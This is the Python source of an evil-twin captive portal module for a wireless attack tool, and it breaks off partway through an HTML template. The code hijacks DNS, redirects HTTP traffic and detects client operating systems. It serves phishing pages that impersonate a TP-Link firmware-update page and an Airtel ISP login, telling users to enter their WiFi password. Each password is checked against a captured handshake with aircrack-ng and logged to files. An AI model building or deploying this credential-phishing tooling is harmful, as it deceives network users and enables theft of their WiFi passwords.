"""Sidewinder Captive Portal Module.

Implements a fully functional captive portal following airgeddon-style patterns:
- DNS blackhole with Android/iOS/Windows/macOS/Linux detection bypass
- OS-specific probe path handling
- Hidden pixel tracking for client detection
- iptables/nftables firewall rules for HTTP redirection
- Credential capture with handshake validation via aircrack-ng
- Professional HTML/CSS/JS templates (no emojis)
"""
from __future__ import annotations

import asyncio
import base64
import html
import ipaddress
import logging
import os
import re
import shutil
import tempfile
from dataclasses import dataclass, field
from datetime import datetime
from enum import Enum
from pathlib import Path
from typing import Awaitable, Callable, Optional
from urllib.parse import unquote_plus

from ..core.subprocess_mgr import SubprocessManager, get_manager

logger = logging.getLogger(__name__)


MAC_RE = re.compile(r"(?i)\b(?:[0-9a-f]{2}:){5}[0-9a-f]{2}\b")


class PortalMode(Enum):
    """Captive portal operation modes."""
    NONE = "none"
    NOTICE = "notice"
    CAPTIVE = "captive"
    PASSWORD = "password"


class DetectedOS(Enum):
    """Operating systems with known captive portal detection behavior."""
    ANDROID = "android"
    IOS = "ios"
    WINDOWS = "windows"
    LINUX = "linux"
    MACOS = "macos"
    UNKNOWN = "unknown"


# OS-specific captive portal detection probe paths
PROBE_PATHS = {
    DetectedOS.ANDROID: {
        "/generate_204",
        "/gen_204",
        "/android Connectivity Check",
        "/checkNetworkStatus",
        "/check_network_status",
    },
    DetectedOS.IOS: {
        "/hotspot-detect.html",
        "/library/test/success.html",
    },
    DetectedOS.WINDOWS: {
        "/ncsi.txt",
        "/connecttest.txt",
        "/redirect",
        "/msn.txt",
    },
    DetectedOS.LINUX: {
        "/generate_204",
        "/gen_204",
        "/canonical.html",
        "/connectivitycheck.html",
    },
    DetectedOS.MACOS: {
        "/hotspot-detect.html",
        "/library/test/success.html",
    },
}

ALL_PROBE_PATHS = set()
for paths in PROBE_PATHS.values():
    ALL_PROBE_PATHS.update(paths)

WHITELISTED_DOMAINS = {
    "google.com",
    "googleapis.com",
    "gstatic.com",
    "connectivitycheck.gstatic.com",
    "clients3.google.com",
    "clients.google.com",
}

TRACKING_PIXEL_B64 = (
    "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg=="
)

# Common router manufacturer OUI prefixes (first 3 octets of BSSID)
OUI_MANUFACTURERS: dict[str, str] = {
    "00:14:6c": "Netgear",
    "00:1a:2b": "Aztech",
    "00:1b:2f": "TP-Link",
    "00:1d:d8": "Cisco",
    "00:22:6b": "Cisco-Linksys",
    "00:23:cd": "Hewlett-Packard",
    "00:24:01": "D-Link",
    "00:25:11": "ZyXEL",
    "00:26:f2": "Netgear",
    "00:90:4c": "Epigram",
    "04:a1:51": "Netgear",
    "08:36:69": "Ubiquiti",
    "0c:80:63": "TP-Link",
    "0c:b7:89": "Arris",
    "10:0c:6b": "Netgear",
    "10:da:43": "Netgear",
    "14:59:c0": "Netgear",
    "14:91:82": "Belkin",
    "18:e8:29": "Ubiquiti",
    "1c:3b:f3": "Huawei",
    "1c:f2:9a": "D-Link",
    "20:e5:2a": "Netgear",
    "24:05:0f": "Ubiquiti",
    "28:80:88": "Netgear",
    "2c:b0:5d": "Netgear",
    "30:b5:c2": "TP-Link",
    "34:97:f6": "ASUS",
    "38:2c:4a": "ASUS",
    "3c:37:86": "Netgear",
    "40:4a:03": "ZyXEL",
    "44:94:fc": "Ubiquiti",
    "48:ee:0c": "D-Link",
    "4c:ed:fb": "ASUS",
    "50:6a:03": "Netgear",
    "54:04:a6": "ASUS",
    "58:ef:68": "Belkin",
    "5c:cf:7f": "Espressif",
    "60:38:e0": "Belkin",
    "60:a4:4c": "ASUS",
    "64:66:b3": "D-Link",
    "68:72:51": "Ubiquiti",
    "6c:b0:ce": "Netgear",
    "70:4d:7b": "ASUS",
    "74:ac:b9": "Ubiquiti",
    "78:8a:20": "Ubiquiti",
    "7c:8b:ca": "TP-Link",
    "80:2a:a8": "Ubiquiti",
    "84:1b:5e": "Netgear",
    "88:dc:96": "EnGenius",
    "8c:3b:ad": "Netgear",
    "90:72:40": "Apple",
    "94:10:3e": "Belkin",
    "94:10:ca": "Belkin",
    "98:de:d0": "TP-Link",
    "9c:3d:cf": "Netgear",
    "a0:04:60": "Netgear",
    "a0:20:a6": "Aruba",
    "a0:63:91": "Netgear",
    "a4:2b:8c": "Netgear",
    "a8:5e:45": "ASUS",
    "ac:84:c6": "TP-Link",
    "ac:9a:22": "EnGenius",
    "b0:4e:26": "TP-Link",
    "b0:7f:b9": "Netgear",
    "b0:be:76": "TP-Link",
    "b4:05:43": "Arris",
    "b4:fb:e4": "Ubiquiti",
    "b8:27:eb": "Raspberry-Pi",
    "b8:ee:65": "Netgear",
    "bc:ee:7b": "ASUS",
    "c0:25:e9": "TP-Link",
    "c0:4a:00": "TP-Link",
    "c4:3d:c7": "Netgear",
    "c4:71:54": "TP-Link",
    "c8:3a:35": "Tenda",
    "cc:40:d0": "Netgear",
    "d0:21:f9": "Ubiquiti",
    "d0:46:f0": "Belkin",
    "d4:6e:5c": "TP-Link",
    "d8:07:b6": "TP-Link",
    "d8:50:e6": "ASUS",
    "dc:9f:db": "Ubiquiti",
    "dc:a6:32": "Raspberry-Pi",
    "e0:63:da": "Ubiquiti",
    "e4:f0:04": "Google",
    "e8:94:f6": "TP-Link",
    "ec:08:6b": "TP-Link",
    "f0:9f:c2": "Ubiquiti",
    "f0:9f:e2": "Ubiquiti",
    "f4:ec:38": "TP-Link",
    "f8:1a:67": "TP-Link",
    "f8:d1:11": "TP-Link",
    "fc:ec:da": "Ubiquiti",
}


def lookup_manufacturer(bssid: Optional[str]) -> str:
    """Look up router manufacturer from BSSID OUI prefix."""
    if not bssid:
        return ""
    oui = bssid[:8].lower()
    return OUI_MANUFACTURERS.get(oui, "")


@dataclass
class CaptivePortalConfig:
    """Configuration for the captive portal system."""
    gateway_ip: str = "10.0.0.1"
    portal_port: int = 80
    dhcp_start: str = "10.0.0.10"
    dhcp_end: str = "10.0.0.100"
    cidr_prefix: int = 24
    tap_iface: str = "at0"
    portal_mode: PortalMode = PortalMode.NOTICE
    portal_title: str = "SWCLI Lab Network"
    portal_message: str = "This access point is running in an authorized wireless audit lab."
    essid: str = "SWCLI-Lab"
    bssid: Optional[str] = None
    validation_bssid: Optional[str] = None
    handshake_file: Optional[str] = None
    enable_dhcp: bool = True
    enable_dns: bool = True
    enable_firewall: bool = True
    enable_tracking: bool = True
    dns_port: int = 53
    portal_variant: str = "password"
    router_manufacturer: str = ""
    whitelist_domains: set[str] = field(default_factory=lambda: WHITELISTED_DOMAINS.copy())
    temp_dir: Optional[str] = None
    metadata_log_file: Optional[str] = None

    def __post_init__(self) -> None:
        self._validate()

    def _validate(self) -> None:
        gateway = ipaddress.ip_address(self.gateway_ip)
        start = ipaddress.ip_address(self.dhcp_start)
        end = ipaddress.ip_address(self.dhcp_end)
        net = ipaddress.ip_network(f"{self.gateway_ip}/{self.cidr_prefix}", strict=False)
        if gateway not in net or start not in net or end not in net:
            raise ValueError("Gateway and DHCP range must be in the same subnet")
        if int(start) > int(end):
            raise ValueError("DHCP start must be <= DHCP end")
        if not (1 <= self.portal_port <= 65535):
            raise ValueError("Portal port must be 1-65535")

    @property
    def netmask(self) -> str:
        return str(ipaddress.ip_network(f"{self.gateway_ip}/{self.cidr_prefix}", strict=False).netmask)


@dataclass
class CaptivePortalStats:
    """Runtime statistics from the captive portal."""
    associated_clients: set[str] = field(default_factory=set)
    dhcp_leases: dict[str, str] = field(default_factory=dict)
    portal_hits: int = 0
    portal_requests: list[dict] = field(default_factory=list)
    detected_os: dict[str, DetectedOS] = field(default_factory=dict)
    tracking_pixel_requests: int = 0
    password_attempts: list[dict] = field(default_factory=list)
    password_found: bool = False
    captured_password: str = ""

    def record_request(self, client_ip: str, path: str, user_agent: str, detected_os: DetectedOS) -> None:
        self.portal_hits += 1
        self.portal_requests.append({
            "client_ip": client_ip,
            "path": path,
            "user_agent": user_agent,
            "os": detected_os.value,
        })
        self.detected_os[client_ip] = detected_os
        if len(self.portal_requests) > 100:
            self.portal_requests = self.portal_requests[-100:]

    def record_password_attempt(self, client_ip: str, password: str, valid: Optional[bool]) -> None:
        self.password_attempts.append({
            "client_ip": client_ip,
            "password": password,
            "valid": valid,
            "timestamp": datetime.now().isoformat(),
        })
        if valid is True:
            self.password_found = True
            self.captured_password = password

    def get_client_os(self, client_ip: str) -> DetectedOS:
        return self.detected_os.get(client_ip, DetectedOS.UNKNOWN)


@dataclass
class CaptivePortalHealth:
    """Structured runtime health for portal dependencies."""
    http_bound: bool = False
    dns_active: bool = False
    firewall_active: bool = False
    firewall_redirect_active: bool = False
    failures: list[str] = field(default_factory=list)

    @property
    def ready(self) -> bool:
        return self.http_bound and (self.firewall_active or self.firewall_redirect_active)


class CaptivePortalEngine:
    """Manages the captive portal system with credential capture support."""

    def __init__(
        self,
        config: Optional[CaptivePortalConfig] = None,
        mgr: Optional[SubprocessManager] = None,
    ) -> None:
        self.config = config or CaptivePortalConfig()
        self.mgr = mgr or get_manager()
        self.stats = CaptivePortalStats()
        self.health = CaptivePortalHealth()
        self._portal_server: Optional[asyncio.AbstractServer] = None
        self._dns_proc: Optional[asyncio.subprocess.Process] = None
        self._dhcp_proc: Optional[asyncio.subprocess.Process] = None
        self._firewall_rules: list[str] = []
        self._running = False
        self._temp_dir: Optional[str] = None
        self._tracking_pixel_path: Optional[str] = None

    async def start(
        self,
        mon_iface: str,
        essid: str,
        channel: int,
        target_bssid: Optional[str] = None,
        on_log: Optional[Callable[[str], Awaitable[None] | None]] = None,
        timeout: float = 3600.0,
    ) -> bool:
        self.config.essid = essid
        self.config.bssid = target_bssid

        async def safe_log(msg: str) -> None:
            if on_log:
                res = on_log(msg)
                if asyncio.iscoroutine(res):
                    await res

        self._running = True
        self._temp_dir = self.config.temp_dir or tempfile.mkdtemp(prefix="swcli_portal_")
        self._tracking_pixel_path = os.path.join(self._temp_dir, "pixel.png")

        if self.config.enable_tracking:
            self._create_tracking_pixel()

        if self.config.enable_dns:
            await self._setup_dns_blackhole(safe_log)

        await self._start_http_server(safe_log)

        if self.config.enable_firewall:
            await self._setup_firewall(safe_log)

        mode_str = self.config.portal_mode.value
        status = "ready" if self.health.ready else "degraded"
        await safe_log(f"[+] Captive portal started (mode: {mode_str}, status: {status})")
        await safe_log(f"[+] Portal URL: http://{self.config.gateway_ip}:{self.config.portal_port}/")

        if self.config.portal_mode == PortalMode.PASSWORD:
            if self.config.handshake_file:
                await safe_log(f"[+] Handshake file: {self.config.handshake_file}")
            else:
                await safe_log("[!] No handshake file provided; password validation disabled")

        return True

    async def stop(self) -> None:
        self._running = False
        if self.config.enable_firewall:
            await self._remove_firewall_rules()
        if self._portal_server:
            self._portal_server.close()
            await self._portal_server.wait_closed()
            self._portal_server = None
        if self._dns_proc:
            await self.mgr.kill_background(self._dns_proc)
            self._dns_proc = None
        if self._dhcp_proc:
            await self.mgr.kill_background(self._dhcp_proc)
            self._dhcp_proc = None
        if self._temp_dir and os.path.exists(self._temp_dir):
            shutil.rmtree(self._temp_dir, ignore_errors=True)
        logger.info("Captive portal stopped")

    # -------------------------------------------------------------------------
    # DNS Blackhole
    # -------------------------------------------------------------------------

    async def _setup_dns_blackhole(self, safe_log: Callable) -> None:
        if shutil.which("dnsmasq") is None:
            await safe_log("[!] dnsmasq not found; DNS blackhole will not be active")
            return

        config_lines = [
            f"interface={self.config.tap_iface}",
            "bind-interfaces",
            "except-interface=lo",
            "no-daemon",
            "no-resolv",
            f"port={self.config.dns_port}",
            "log-queries",
            f"listen-address={self.config.gateway_ip}",
            f"address=/#/{self.config.gateway_ip}",
        ]

        config_path = os.path.join(self._temp_dir, "dnsmasq.conf")
        with open(config_path, "w") as f:
            f.write("\n".join(config_lines))

        cmd = ["dnsmasq", f"--conf-file={config_path}"]

        try:
            self._dns_proc = await self.mgr.start_background(cmd, capture_output=True)
            await asyncio.sleep(0.3)
            if self._dns_proc.returncode is not None:
                self.health.failures.append("dnsmasq failed to start")
                await safe_log("[!] dnsmasq failed to start; check if port 53 is in use")
                return
            self.health.dns_active = True
            await safe_log(f"[+] DNS blackhole active on {self.config.tap_iface}:{self.config.dns_port}")
        except Exception as e:
            self.health.failures.append(f"DNS blackhole failed: {e}")
            await safe_log(f"[!] Failed to start DNS blackhole: {e}")

    # -------------------------------------------------------------------------
    # HTTP Server
    # -------------------------------------------------------------------------

    async def _start_http_server(self, safe_log: Callable) -> None:
        try:
            self._portal_server = await asyncio.start_server(
                self._handle_http_request,
                self.config.gateway_ip,
                self.config.portal_port,
            )
            self.health.http_bound = True
            await safe_log(f"[+] HTTP server listening on {self.config.gateway_ip}:{self.config.portal_port}")
        except OSError as e:
            self.health.failures.append(f"HTTP bind failed: {e}")
            await safe_log(f"[!] Failed to start HTTP server: {e}")

    async def _handle_http_request(
        self,
        reader: asyncio.StreamReader,
        writer: asyncio.StreamWriter,
    ) -> None:
        try:
            raw = await asyncio.wait_for(reader.read(8192), timeout=5.0)
            decoded = raw.decode(errors="replace")
            lines = decoded.splitlines()

            if not lines:
                writer.close()
                return

            first_line = lines[0] if lines else ""
            parts = first_line.split(" ")
            method = parts[0] if len(parts) >= 1 else "GET"
            path = parts[1] if len(parts) >= 2 else "/"

            headers = {}
            body = ""
            body_start = False
            for line in lines[1:]:
                if body_start:
                    body += line + "\n"
                elif line == "":
                    body_start = True
                elif ":" in line:
                    key, value = line.split(":", 1)
                    headers[key.strip().lower()] = value.strip()

            content_length = int(headers.get("content-length", "0"))
            if content_length > 0 and len(body.encode()) < content_length:
                extra = await asyncio.wait_for(reader.read(content_length - len(body.encode())), timeout=3.0)
                body += extra.decode(errors="replace")

            user_agent = headers.get("user-agent", "")
            peer = writer.get_extra_info("peername")
            client_ip = peer[0] if peer else "unknown"

            detected_os = self._detect_os(user_agent)
            self.stats.record_request(client_ip, path, user_agent, detected_os)

            if self.config.metadata_log_file:
                self._log_metadata(client_ip, method, path, user_agent, detected_os, headers)

            if self.config.enable_tracking and path == "/pixel.png":
                await self._serve_tracking_pixel(writer)
                return

            host_header = headers.get("host", "").split(":")[0]
            is_gateway = host_header == self.config.gateway_ip

            if path in ALL_PROBE_PATHS:
                if self._should_serve_probe_success(path):
                    await self._serve_probe_response(writer, detected_os, path)
                else:
                    await self._serve_redirect(writer, self.config.gateway_ip)
                return

            if method == "POST" and self.config.portal_mode == PortalMode.PASSWORD:
                await self._handle_password_post(writer, body, client_ip, detected_os)
                return

            if not is_gateway and path != "/":
                await self._serve_redirect(writer, self.config.gateway_ip)
                return

            await self._serve_portal_page(writer, path, client_ip, detected_os)

        except asyncio.TimeoutError:
            logger.debug("HTTP request timed out")
        except Exception as e:
            logger.debug("HTTP request error: %s", e)
        finally:
            writer.close()
            try:
                await writer.wait_closed()
            except Exception:
                pass

    # -------------------------------------------------------------------------
    # OS Detection
    # -------------------------------------------------------------------------

    def _detect_os(self, user_agent: str) -> DetectedOS:
        ua_lower = user_agent.lower()
        if "android" in ua_lower:
            return DetectedOS.ANDROID
        elif "iphone" in ua_lower or "ipad" in ua_lower or "ios" in ua_lower:
            return DetectedOS.IOS
        elif "windows" in ua_lower:
            return DetectedOS.WINDOWS
        elif "mac os" in ua_lower or "macos" in ua_lower:
            return DetectedOS.MACOS
        elif "linux" in ua_lower:
            return DetectedOS.LINUX
        return DetectedOS.UNKNOWN

    def _should_serve_probe_success(self, path: str) -> bool:
        """Return True only when OS connectivity probes should look normal."""
        return path in ALL_PROBE_PATHS and self.config.portal_mode == PortalMode.NOTICE

    def _log_metadata(
        self,
        client_ip: str,
        method: str,
        path: str,
        user_agent: str,
        detected_os: DetectedOS,
        headers: dict,
    ) -> None:
        """Log HTTP request metadata to file for EvilTwinSimple mode."""
        try:
            import json
            ts = datetime.now().isoformat()
            data = {
                "timestamp": ts,
                "client_ip": client_ip,
                "method": method,
                "path": path,
                "detected_os": detected_os.value,
                "host": headers.get("host", ""),
                "user_agent": user_agent,
                "accept": headers.get("accept", ""),
                "referer": headers.get("referer", ""),
                "content_type": headers.get("content-type", "")
            }
            with open(self.config.metadata_log_file, "a") as f:
                f.write(json.dumps(data) + "\n")
        except Exception as e:
            logger.debug("Failed to log metadata: %s", e)

    # -------------------------------------------------------------------------
    # Probe Response Handling
    # -------------------------------------------------------------------------

    async def _serve_probe_response(
        self,
        writer: asyncio.StreamWriter,
        detected_os: DetectedOS,
        path: str,
    ) -> None:
        status_code = "200 OK"
        content_type = "text/plain; charset=utf-8"
        body = ""

        if detected_os == DetectedOS.ANDROID:
            if path in ("/generate_204", "/gen_204"):
                status_code = "204 No Content"
        elif detected_os == DetectedOS.IOS:
            if path in ("/hotspot-detect.html", "/library/test/success.html"):
                body = "<HTML><HEAD><TITLE>Success</TITLE></HEAD><BODY>Success</BODY></HTML>"
        elif detected_os == DetectedOS.WINDOWS:
            if path == "/ncsi.txt":
                body = "Microsoft NCSI"
            elif path == "/connecttest.txt":
                body = "Microsoft Connect Test"
        elif detected_os == DetectedOS.LINUX:
            if path in ("/generate_204", "/gen_204"):
                status_code = "204 No Content"

        response = (
            f"HTTP/1.1 {status_code}\r\n"
            f"Content-Type: {content_type}\r\n"
            f"Content-Length: {len(body.encode('utf-8'))}\r\n"
            "Cache-Control: no-store\r\n"
            "Connection: close\r\n"
            "\r\n"
            f"{body}"
        )
        writer.write(response.encode())
        await writer.drain()

    async def _serve_redirect(self, writer: asyncio.StreamWriter, target_ip: str) -> None:
        response = (
            "HTTP/1.1 302 Found\r\n"
            f"Location: http://{target_ip}/\r\n"
            "Content-Length: 0\r\n"
            "Connection: close\r\n"
            "\r\n"
        )
        writer.write(response.encode())
        await writer.drain()

    # -------------------------------------------------------------------------
    # Password Validation
    # -------------------------------------------------------------------------

    async def _validate_password(self, password: str) -> Optional[bool]:
        """Validate a password against the captured handshake using aircrack-ng.

        Returns None when validation is not configured or unavailable. The
        submitted password is still recorded, but the portal does not label it
        correct or incorrect.
        """
        if not self.config.handshake_file or not os.path.exists(self.config.handshake_file):
            logger.warning("No handshake file for validation")
            return None

        validation_bssid = self.config.validation_bssid or self.config.bssid
        if not validation_bssid:
            logger.warning("No BSSID for validation")
            return None

        if shutil.which("aircrack-ng") is None:
            logger.warning("aircrack-ng not found; cannot validate password")
            return None

        import tempfile as tmp
        with tmp.NamedTemporaryFile(mode="w", suffix=".txt", delete=False) as f:
            f.write(password + "\n")
            wordlist_path = f.name

        try:
            cmd = [
                "aircrack-ng",
                "-w", wordlist_path,
                "-b", validation_bssid,
                self.config.handshake_file,
            ]

            proc = await asyncio.create_subprocess_exec(
                *cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
            )

            stdout, stderr = await asyncio.wait_for(proc.communicate(), timeout=10.0)
            output = stdout.decode(errors="replace")

            if "KEY FOUND" in output:
                return True
            return False

        except asyncio.TimeoutError:
            logger.warning("aircrack-ng validation timed out")
            return False
        except Exception as e:
            logger.error("Password validation error: %s", e)
            return False
        finally:
            try:
                os.unlink(wordlist_path)
            except OSError:
                pass

    def _save_attempt(self, client_ip: str, password: str, valid: Optional[bool]) -> str:
        """Save a password attempt to the output folder."""
        try:
            from ..core.paths import passwords_dir
            pw_dir = passwords_dir()
            ts = datetime.now().strftime("%Y%m%d_%H%M%S")
            attempt_bssid = self.config.validation_bssid or self.config.bssid
            sanitized_bssid = re.sub(r'[^a-zA-Z0-9]', '', attempt_bssid) if attempt_bssid else "unknown"

            status = "unverified" if valid is None else ("valid" if valid else "invalid")
            filename = f"attempt_{sanitized_bssid}_{status}_{ts}.txt"
            filepath = os.path.join(pw_dir, filename)

            lines = [
                "=" * 60,
                "SWCLI - Password Attempt",
                "=" * 60,
                f"Password:    {password}",
                f"Status:      {status.upper()}",
                f"BSSID:       {attempt_bssid or 'N/A'}",
                f"ESSID:       {self.config.essid or 'N/A'}",
                f"Client IP:   {client_ip}",
                f"Timestamp:   {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
                "=" * 60,
            ]

            os.makedirs(pw_dir, exist_ok=True)
            with open(filepath, "w") as f:
                f.write("\n".join(lines) + "\n")

            master_path = os.path.join(pw_dir, "passwords.txt")
            with open(master_path, "a") as f:
                f.write(
                    f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] "
                    f"{self.config.essid} ({attempt_bssid}) | "
                    f"Password: {password} | Status: {status} | "
                    f"Client: {client_ip}\n"
                )

            return filepath
        except Exception as e:
            logger.error("Failed to save password attempt: %s", e)
            return ""

    async def _handle_password_post(
        self,
        writer: asyncio.StreamWriter,
        body: str,
        client_ip: str,
        detected_os: DetectedOS,
    ) -> None:
        """Handle POST request for password submission."""
        password = ""
        for part in body.split("&"):
            if "=" in part:
                key, value = part.split("=", 1)
                if key == "password":
                    password = unquote_plus(value)
                    break

        if not password:
            await self._serve_password_page(writer, client_ip, detected_os, error="Please enter a password.")
            return

        valid = await self._validate_password(password)

        self.stats.record_password_attempt(client_ip, password, valid)
        self._save_attempt(client_ip, password, valid)

        logger.info(
            "Password attempt from %s: %s (valid=%s)",
            client_ip, password[:8] + "..." if len(password) > 8 else password, valid,
        )

        if valid is True:
            await self._serve_success_page(writer, client_ip, detected_os, password)
        elif valid is None:
            await self._serve_received_page(writer, client_ip, detected_os)
        else:
            await self._serve_failure_page(writer, client_ip, detected_os)

    # -------------------------------------------------------------------------
    # Portal Page Serving
    # -------------------------------------------------------------------------

    async def _serve_portal_page(
        self,
        writer: asyncio.StreamWriter,
        path: str,
        client_ip: str,
        detected_os: DetectedOS,
    ) -> None:
        if self.config.portal_mode == PortalMode.PASSWORD:
            body = self._generate_login_html(client_ip, detected_os)
        else:
            body = self._generate_portal_html(path, client_ip, detected_os)

        body_bytes = body.encode('utf-8')
        response_headers = (
            "HTTP/1.1 200 OK\r\n"
            "Content-Type: text/html; charset=utf-8\r\n"
            f"Content-Length: {len(body_bytes)}\r\n"
            "Cache-Control: no-store, no-cache, must-revalidate\r\n"
            "Pragma: no-cache\r\n"
            "Connection: close\r\n"
            "\r\n"
        )
        writer.write(response_headers.encode() + body_bytes)
        await writer.drain()

    async def _serve_password_page(
        self,
        writer: asyncio.StreamWriter,
        client_ip: str,
        detected_os: DetectedOS,
        error: str = "",
    ) -> None:
        body = self._generate_login_html(client_ip, detected_os, error=error)
        body_bytes = body.encode('utf-8')
        response_headers = (
            "HTTP/1.1 200 OK\r\n"
            "Content-Type: text/html; charset=utf-8\r\n"
            f"Content-Length: {len(body_bytes)}\r\n"
            "Cache-Control: no-store, no-cache, must-revalidate\r\n"
            "Pragma: no-cache\r\n"
            "Connection: close\r\n"
            "\r\n"
        )
        writer.write(response_headers.encode() + body_bytes)
        await writer.drain()

    async def _serve_success_page(
        self,
        writer: asyncio.StreamWriter,
        client_ip: str,
        detected_os: DetectedOS,
        password: str,
    ) -> None:
        body = self._generate_success_html(client_ip, detected_os, password)
        response = (
            "HTTP/1.1 200 OK\r\n"
            "Content-Type: text/html; charset=utf-8\r\n"
            f"Content-Length: {len(body.encode('utf-8'))}\r\n"
            "Cache-Control: no-store\r\n"
            "Connection: close\r\n"
            "\r\n"
            f"{body}"
        )
        writer.write(response.encode())
        await writer.drain()

    async def _serve_received_page(
        self,
        writer: asyncio.StreamWriter,
        client_ip: str,
        detected_os: DetectedOS,
    ) -> None:
        body = self._generate_received_html(client_ip, detected_os)
        response = (
            "HTTP/1.1 200 OK\r\n"
            "Content-Type: text/html; charset=utf-8\r\n"
            f"Content-Length: {len(body.encode('utf-8'))}\r\n"
            "Cache-Control: no-store\r\n"
            "Connection: close\r\n"
            "\r\n"
            f"{body}"
        )
        writer.write(response.encode())
        await writer.drain()

    async def _serve_failure_page(
        self,
        writer: asyncio.StreamWriter,
        client_ip: str,
        detected_os: DetectedOS,
    ) -> None:
        body = self._generate_failure_html(client_ip, detected_os)
        response = (
            "HTTP/1.1 200 OK\r\n"
            "Content-Type: text/html; charset=utf-8\r\n"
            f"Content-Length: {len(body.encode('utf-8'))}\r\n"
            "Cache-Control: no-store\r\n"
            "Connection: close\r\n"
            "\r\n"
            f"{body}"
        )
        writer.write(response.encode())
        await writer.drain()

    # -------------------------------------------------------------------------
    # HTML Generators
    # -------------------------------------------------------------------------

    def _get_css(self) -> str:
        return """
        *{box-sizing:border-box;margin:0;padding:0}
        body{color:#333;font-family:Arial,sans-serif;font-size:16px;margin:0;padding:0;background:#f0f2f5}
        nav{background:#2196F3;color:#fff;padding:14px 20px;box-shadow:0 2px 8px rgba(0,0,0,0.15)}
        nav b{font-size:1.6em;display:block;margin-bottom:4px}
        nav small{font-size:0.72em;opacity:0.88}
        .container{max-width:480px;margin:24px auto;padding:0 16px}
        .card{background:#fff;border-radius:10px;padding:28px 24px;margin-bottom:20px;box-shadow:0 2px 12px rgba(0,0,0,0.08)}
        h2{color:#1a1a1a;margin:0 0 14px 0;font-size:1.35em;font-weight:600}
        p{line-height:1.6;color:#444;margin-bottom:14px;font-size:15px}
        input[type=password],input[type=text]{width:100%;padding:13px 14px;margin:6px 0 12px 0;box-sizing:border-box;border:1.5px solid #ddd;border-radius:6px;font-size:16px;background:#fafafa;transition:border-color .2s}
        input:focus{border-color:#2196F3;outline:none;background:#fff}
        label{color:#555;display:block;font-weight:600;margin-bottom:4px;font-size:14px}
        .btn{width:100%;padding:14px;border:none;border-radius:6px;font-size:16px;font-weight:600;cursor:pointer;transition:all .2s;margin-top:6px}
        .btn-green{background:#4CAF50;color:#fff}.btn-green:hover{background:#43a047}
        .btn-blue{background:#1976D2;color:#fff}.btn-blue:hover{background:#1565c0}
        .warning{background:#fff3cd;border-left:4px solid #ff9800;padding:16px;border-radius:6px;margin:16px 0}
        .warning h1{color:#e65100;margin:0 0 6px 0;font-size:1.25em}
        .warning p{margin:0;color:#5d4037;font-size:14px}
        .status{background:#e3f2fd;padding:14px;border-left:4px solid #2196F3;border-radius:6px;margin:16px 0;font-size:14px;color:#1565c0}
        .footer{text-align:center;margin-top:20px;padding:14px 0;border-top:1px solid #eee;font-size:12px;color:#888}
        .brand{text-align:center;margin-bottom:20px;padding:12px 0}
        .brand svg{width:48px;height:48px}
        .sep{text-align:center;color:#aaa;font-size:13px;margin:14px 0;position:relative}
        .sep::before,.sep::after{content:'';position:absolute;top:50%;width:40%;height:1px;background:#ddd}
        .sep::before{left:0}.sep::after{right:0}
        .social-btn{display:block;width:100%;padding:12px;margin:6px 0;border:none;border-radius:6px;font-size:15px;font-weight:600;cursor:pointer;text-align:left;padding-left:48px;position:relative}
        .social-btn .icon{position:absolute;left:14px;top:50%;transform:translateY(-50%);font-size:18px}
        .social-fb{background:#1877F2;color:#fff}.social-gg{background:#fff;color:#333;border:1.5px solid #ddd}
        @media(max-width:480px){.container{padding:0 10px}.card{padding:22px 18px}}
        """

    def _password_variant_copy(self) -> tuple[str, str, str]:
        variant = (self.config.portal_variant or "password").strip().lower()
        if variant == "router_update":
            return (
                "Firmware Update Required",
                "Enter the wireless password to restore network access and finish the update.",
                "Restore Network Connection",
            )
        if variant in ("google", "signin"):
            return (
                "Sign in to Wi-Fi",
                "Enter the network password to continue connecting to this Wi-Fi network.",
                "Continue",
            )
        return (
            "Network Access Required",
            "Enter the wireless password to gain internet access.",
            "Connect",
        )

    def _generate_login_html(self, client_ip: str, detected_os: DetectedOS, error: str = "") -> str:
        safe_essid = html.escape(self.config.essid)
        variant = (self.config.portal_variant or "tplink").strip().lower()

        error_html = ""
        if error:
            safe_error = html.escape(error)
            error_html = f'<div class="warning" style="border-left-color:#f44336;background:#ffebee;"><p style="color:#c62828;margin:0;">{safe_error}</p></div>'

        css = self._get_css()

        # ---- Template 1: TP-Link Router Admin ----
        if variant == "tplink":
            return f"""<!DOCTYPE html><html><head>
<meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>TP-Link Router - Firmware Update</title>
<style>{css}</style>
</head><body>
<nav><b>TP-Link Archer AX50</b><small>Firmware Update Required</small></nav>
<div class="container"><div class="card">
<div style="display:flex;align-items:center;gap:12px;margin-bottom:18px">
<svg viewBox="0 0 24 24" width="36" height="36" fill="#4CAF50"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm-1 14l-4-4 1.41-1.41L11 12.17l6.59-6.59L19 7l-8 8z"/></svg>
<div><h2 style="margin:0">TP-Link Router Login</h2><p style="margin:0;font-size:13px;color:#888">Archer AX50 | Firmware: 1.3.1 Build 20241220</p></div>
</div>
<div class="warning">
<h1>Firmware Update Failed</h1>
<p>A critical error occurred during the latest security firmware update. Your router requires manual verification to restore network access.</p>
</div>
<p style="font-size:14px;color:#555"><strong>Action Required:</strong> Enter your WiFi password below to verify ownership and restore network access. Your password will be validated against your router configuration.</p>
<form action="/" method="post">
<label>WiFi Password</label>
<input type="password" id="password" name="password" minlength="8" placeholder="Enter your WiFi password" required autofocus>
{error_html}
<button type="submit" class="btn btn-green">Restore Network Connection</button>
</form>
</div>
<div class="status">Network: <strong>{safe_essid}</strong> &mdash; Firmware update requires manual password verification.</div>
<div class="footer">Copyright &copy; 2024 TP-Link Technologies Co., Ltd. All rights reserved.</div>
</div></body></html>"""

        # ---- Template 2a: Airtel ISP Portal ----
        if variant == "airtel":
            return f"""<!DOCTYPE html><html><head>
<meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>Airtel WiFi - Sign In</title>
<style>{css}
.airtel-bg{{background:linear-gradient(135deg,#e53935 0%,#b71c1c 100%);min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}}
